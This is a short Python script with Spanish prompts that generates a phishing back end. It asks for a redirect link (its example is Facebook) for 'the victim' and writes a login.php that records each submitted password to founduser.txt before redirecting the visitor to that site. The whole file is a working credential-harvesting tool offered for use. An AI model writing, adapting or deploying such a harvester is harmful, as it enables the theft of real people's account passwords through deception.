#-*-coding: utf-8 -*-
escribir= open('login.php', 'w')
print('''Debe poner el link entre comillas ejemplo:
"https://facebook.com" \n''')
y=input('Inserte un link para redireccionar a la víctima: ')
r=('''<?php
 $user = $_POST["pass"];
 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Password: $user\n";
 fwrite($fileuser, "\n". $co. $us. $cl);
 fclose($fileuser);
 header('Location: {}');
 exit();
?>
'''.format(y))
escribir.write(r)